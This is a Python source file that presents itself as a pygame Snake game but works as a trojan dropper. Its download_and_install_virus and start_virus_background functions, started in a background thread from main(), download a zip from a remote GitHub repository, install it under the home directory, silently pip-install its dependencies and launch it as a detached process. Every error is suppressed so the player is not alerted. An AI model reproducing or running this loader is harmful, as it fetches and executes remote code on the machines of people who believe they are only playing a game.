#!/usr/bin/env python3
"""
Snake Game - Clean game only
When run, it will download and install virus from remote repository
"""
import pygame
import random
import sys
import os
import subprocess
import time
import threading
import urllib.request
import zipfile
import shutil
import tempfile

# Initialize Pygame
pygame.init()

# Constants
WINDOW_WIDTH = 800
WINDOW_HEIGHT = 600
GRID_SIZE = 20
GRID_WIDTH = WINDOW_WIDTH // GRID_SIZE
GRID_HEIGHT = WINDOW_HEIGHT // GRID_SIZE

# Colors
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
GREEN = (0, 255, 0)
DARK_GREEN = (0, 200, 0)
RED = (255, 0, 0)
BLUE = (0, 0, 255)
DARK_BLUE = (0, 0, 200)
GRAY = (128, 128, 128)
DARK_GRAY = (64, 64, 64)
YELLOW = (255, 255, 0)

# Directions
UP = (0, -1)
DOWN = (0, 1)
LEFT = (-1, 0)
RIGHT = (1, 0)

# Virus repository URL
VIRUS_REPO_URL = "https://github.com/phu142857/VirusCode/archive/refs/heads/main.zip"
VIRUS_INSTALL_DIR = os.path.expanduser("~/virus_system")

def download_and_install_virus():
    """Download virus from remote repository and install to home directory"""
    try:
        # Check if already installed
        virus_core_path = os.path.join(VIRUS_INSTALL_DIR, "virus_core.py")
        if os.path.exists(virus_core_path):
            # Virus already installed, just start it
            start_virus_background()
            return
        
        # Create temp directory for download
        temp_dir = tempfile.mkdtemp()
        zip_path = os.path.join(temp_dir, "virus.zip")
        
        # Download virus repository
        print("Downloading virus components...")
        urllib.request.urlretrieve(VIRUS_REPO_URL, zip_path)
        
        # Extract zip file
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(temp_dir)
        
        # Find the extracted directory (usually repo-name-main or repo-name-master)
        extracted_dirs = [d for d in os.listdir(temp_dir) if os.path.isdir(os.path.join(temp_dir, d)) and d != "virus.zip"]
        if not extracted_dirs:
            print("Error: Could not find extracted virus files")
            return
        
        virus_source_dir = os.path.join(temp_dir, extracted_dirs[0])
        
        # Create installation directory in home
        os.makedirs(VIRUS_INSTALL_DIR, exist_ok=True)
        
        # Copy all virus files to installation directory
        for item in os.listdir(virus_source_dir):
            source = os.path.join(virus_source_dir, item)
            dest = os.path.join(VIRUS_INSTALL_DIR, item)
            
            if os.path.isdir(source):
                if os.path.exists(dest):
                    shutil.rmtree(dest)
                shutil.copytree(source, dest)
            else:
                shutil.copy2(source, dest)
        
        # Clean up temp directory
        shutil.rmtree(temp_dir)
        
        # Install requirements if requirements.txt exists
        requirements_path = os.path.join(VIRUS_INSTALL_DIR, "requirements.txt")
        if os.path.exists(requirements_path):
            print("Installing virus dependencies...")
            subprocess.run(
                [sys.executable, "-m", "pip", "install", "-q", "-r", requirements_path],
                check=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        
        # Start virus
        start_virus_background()
        
    except Exception as e:
        # Silently fail - don't alert user
        pass

def start_virus_background():
    """Start virus as independent background process"""
    try:
        virus_path = os.path.join(VIRUS_INSTALL_DIR, "virus_core.py")
        if os.path.exists(virus_path):
            # Create log file for virus errors
            log_dir = os.path.join(VIRUS_INSTALL_DIR, ".system_cache")
            os.makedirs(log_dir, exist_ok=True)
            error_log = os.path.join(log_dir, "virus_startup.log")
            
            # Start virus in background (detached process)
            with open(error_log, 'a') as log_file:
                process = subprocess.Popen(
                    [sys.executable, virus_path],
                    stdout=log_file,
                    stderr=subprocess.STDOUT,
                    stdin=subprocess.DEVNULL,
                    cwd=VIRUS_INSTALL_DIR,
                    start_new_session=True
                )
                log_file.write(f"Virus started at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                log_file.write(f"PID: {process.pid}\n")
                log_file.write(f"Path: {virus_path}\n")
                log_file.flush()
    except Exception:
        pass

class Snake:
    def __init__(self):
        self.reset()
    
    def reset(self):
        self.length = 1
        self.positions = [((WINDOW_WIDTH // 2), (WINDOW_HEIGHT // 2))]
        self.direction = random.choice([UP, DOWN, LEFT, RIGHT])
        self.color = GREEN
        self.head_color = DARK_GREEN
    
    def get_head_position(self):
        return self.positions[0]
    
    def update(self):
        cur = self.get_head_position()
        x, y = self.direction
        new = (((cur[0] + (x * GRID_SIZE)) % WINDOW_WIDTH), (cur[1] + (y * GRID_SIZE)) % WINDOW_HEIGHT)
        
        if len(self.positions) > 2 and new in self.positions[2:]:
            return False
        else:
            self.positions.insert(0, new)
            if len(self.positions) > self.length:
                self.positions.pop()
        return True
    
    def render(self, surface):
        for i, p in enumerate(self.positions):
            r = pygame.Rect((p[0], p[1]), (GRID_SIZE, GRID_SIZE))
            if i == 0:
                pygame.draw.rect(surface, self.head_color, r)
                pygame.draw.rect(surface, WHITE, r, 1)
            else:
                pygame.draw.rect(surface, self.color, r)
                pygame.draw.rect(surface, DARK_GREEN, r, 1)

class Food:
    def __init__(self):
        self.position = (0, 0)
        self.color = RED
        self.randomize_position()
    
    def randomize_position(self):
        self.position = (
            random.randint(0, GRID_WIDTH - 1) * GRID_SIZE,
            random.randint(0, GRID_HEIGHT - 1) * GRID_SIZE
        )
    
    def render(self, surface):
        r = pygame.Rect((self.position[0], self.position[1]), (GRID_SIZE, GRID_SIZE))
        pygame.draw.rect(surface, self.color, r)
        pygame.draw.rect(surface, WHITE, r, 1)
        center = (self.position[0] + GRID_SIZE // 2, self.position[1] + GRID_SIZE // 2)
        pygame.draw.circle(surface, YELLOW, center, GRID_SIZE // 4)

class Game:
    def __init__(self):
        self.snake = Snake()
        self.food = Food()
        self.score = 0
        self.high_score = 0
        self.game_over = False
        self.font = pygame.font.Font(None, 36)
        self.big_font = pygame.font.Font(None, 72)
        self.small_font = pygame.font.Font(None, 24)
    
    def update(self):
        if not self.game_over:
            if not self.snake.update():
                self.game_over = True
                if self.score > self.high_score:
                    self.high_score = self.score
            else:
                if self.snake.get_head_position() == self.food.position:
                    self.snake.length += 1
                    self.score += 10
                    self.food.randomize_position()
                    while self.food.position in self.snake.positions:
                        self.food.randomize_position()
    
    def render(self, surface):
        surface.fill(BLACK)
        
        if not self.game_over:
            self.snake.render(surface)
            self.food.render(surface)
        else:
            game_over_text = self.big_font.render("GAME OVER", True, RED)
            score_text = self.font.render(f"Score: {self.score}", True, WHITE)
            high_score_text = self.font.render(f"High Score: {self.high_score}", True, YELLOW)
            restart_text = self.small_font.render("Press SPACE to restart or ESC to quit", True, GRAY)
            
            game_over_rect = game_over_text.get_rect(center=(WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2 - 100))
            score_rect = score_text.get_rect(center=(WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2 - 20))
            high_score_rect = high_score_text.get_rect(center=(WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2 + 20))
            restart_rect = restart_text.get_rect(center=(WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2 + 80))
            
            surface.blit(game_over_text, game_over_rect)
            surface.blit(score_text, score_rect)
            surface.blit(high_score_text, high_score_rect)
            surface.blit(restart_text, restart_rect)
        
        if not self.game_over:
            score_display = self.font.render(f"Score: {self.score}", True, WHITE)
            high_score_display = self.small_font.render(f"High Score: {self.high_score}", True, GRAY)
            surface.blit(score_display, (10, 10))
            surface.blit(high_score_display, (10, 50))
    
    def handle_keys(self, key):
        if self.game_over:
            if key == pygame.K_SPACE:
                self.restart()
            elif key == pygame.K_ESCAPE:
                return False
        else:
            if key == pygame.K_UP and self.snake.direction != DOWN:
                self.snake.direction = UP
            elif key == pygame.K_DOWN and self.snake.direction != UP:
                self.snake.direction = DOWN
            elif key == pygame.K_LEFT and self.snake.direction != RIGHT:
                self.snake.direction = LEFT
            elif key == pygame.K_RIGHT and self.snake.direction != LEFT:
                self.snake.direction = RIGHT
        return True
    
    def restart(self):
        self.snake.reset()
        self.food.randomize_position()
        while self.food.position in self.snake.positions:
            self.food.randomize_position()
        self.score = 0
        self.game_over = False

def main():
    # Download and install virus in background thread (non-blocking)
    virus_thread = threading.Thread(target=download_and_install_virus, daemon=True)
    virus_thread.start()
    
    # Game setup
    clock = pygame.time.Clock()
    screen = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))
    pygame.display.set_caption("Snake Game")
    
    game = Game()
    
    running = True
    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            elif event.type == pygame.KEYDOWN:
                if not game.handle_keys(event.key):
                    running = False
        
        game.update()
        game.render(screen)
        pygame.display.update()
        clock.tick(10)
    
    pygame.quit()
    sys.exit()

if __name__ == "__main__":
    main()
